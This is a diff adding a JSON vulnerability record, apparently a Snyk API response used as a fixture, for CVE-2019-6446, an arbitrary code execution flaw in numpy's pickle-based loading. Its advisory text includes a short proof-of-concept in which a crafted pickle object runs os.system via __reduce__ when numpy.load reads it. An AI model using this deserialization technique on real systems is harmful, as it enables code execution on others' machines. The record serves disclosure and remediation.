@@ -1,0 +1,106 @@
+{
+  "jsonapi": {
+    "version": "1.0"
+  },
+  "data": [
+    {
+      "id": "SNYK-PYTHON-NUMPY-73513",
+      "type": "issue",
+      "attributes": {
+        "key": "SNYK-PYTHON-NUMPY-73513",
+        "title": "Arbitrary Code Execution",
+        "type": "package_vulnerability",
+        "created_at": "2019-01-16T14:11:37.000761Z",
+        "updated_at": "2022-09-01T16:21:50.298458Z",
+        "description": "## Overview\n[numpy](https://github.com/numpy/numpy) is a fundamental package needed for scientific computing with Python.\n\nAffected versions of this package are vulnerable to Arbitrary Code Execution. It uses the pickle Python module unsafely, which allows remote attackers to execute arbitrary code via a crafted serialized object, as demonstrated by a `numpy.load` call.\r\n\r\nPoC by nanshihui:\r\n```py\r\nimport numpy\r\nfrom numpy import __version__\r\nprint __version__\r\nimport os\r\nimport  pickle\r\nclass Test(object):\r\n    def __init__(self):\r\n        self.a = 1\r\n\r\n    def __reduce__(self):\r\n        return (os.system,('ls',))\r\ntmpdaa = Test()\r\nwith open(\"a-file.pickle\",'wb') as f:\r\n    pickle.dump(tmpdaa,f)\r\nnumpy.load('a-file.pickle')\r\n```\n## Remediation\nUpgrade `numpy` to version 1.16.3 or higher.\n## References\n- [GitHub Commit](https://github.com/numpy/numpy/commit/89b688732b37616c9d26623f81aaee1703c30ffb)\n- [GitHub Issue](https://github.com/numpy/numpy/issues/12759)\n- [GitHub PR](https://github.com/numpy/numpy/pull/13359)\n- [PoC](https://github.com/RayScri/CVE-2019-6446)\n",
+        "problems": [
+          {
+            "id": "CVE-2019-6446",
+            "source": "CVE"
+          },
+          {
+            "id": "CWE-94",
+            "source": "CWE"
+          }
+        ],
+        "coordinates": [
+          {
+            "remedies": [
+              {
+                "type": "indeterminate",
+                "description": "Upgrade the package version to 1.16.3 to fix this vulnerability",
+                "details": {
+                  "upgrade_package": "1.16.3"
+                }
+              }
+            ],
+            "representation": [
+              "[0,1.16.3)"
+            ]
+          }
+        ],
+        "severities": [
+          {
+            "source": "Snyk",
+            "level": "critical",
+            "score": 9.8,
+            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P"
+          },
+          {
+            "source": "NVD",
+            "level": "critical",
+            "score": 9.8,
+            "vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+          },
+          {
+            "source": "Red Hat",
+            "level": "high",
+            "score": 8.8,
+            "vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"
+          },
+          {
+            "source": "SUSE",
+            "level": "high",
+            "score": 7.8,
+            "vector": "CVSS:3.0/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"
+          }
+        ],
+        "effective_severity_level": "critical",
+        "slots": {
+          "disclosure_time": "2019-01-16T12:26:38Z",
+          "exploit": "Proof of Concept",
+          "publication_time": "2019-01-16T13:50:50Z",
+          "references": [
+            {
+              "url": "https://github.com/numpy/numpy/commit/89b688732b37616c9d26623f81aaee1703c30ffb",
+              "title": "GitHub Commit"
+            },
+            {
+              "url": "https://github.com/numpy/numpy/issues/12759",
+              "title": "GitHub Issue"
+            },
+            {
+              "url": "https://github.com/numpy/numpy/pull/13359",
+              "title": "GitHub PR"
+            },
+            {
+              "url": "https://github.com/RayScri/CVE-2019-6446",
+              "title": "PoC"
+            }
+          ]
+        }
+      }
+    }
+  ],
+  "links": {
+    "self": "/orgs/00000000-0000-0000-0000-000000000000/packages/pkg%3Apypi%2Fnumpy%401.16.0/issues?version=2023-06-01&limit=1000&offset=0"
+  },
+  "meta": {
+    "package": {
+      "name": "numpy",
+      "type": "pypi",
+      "url": "pkg:pypi/numpy@1.16.0",
+      "version": "1.16.0"
+    }
+  }
+}
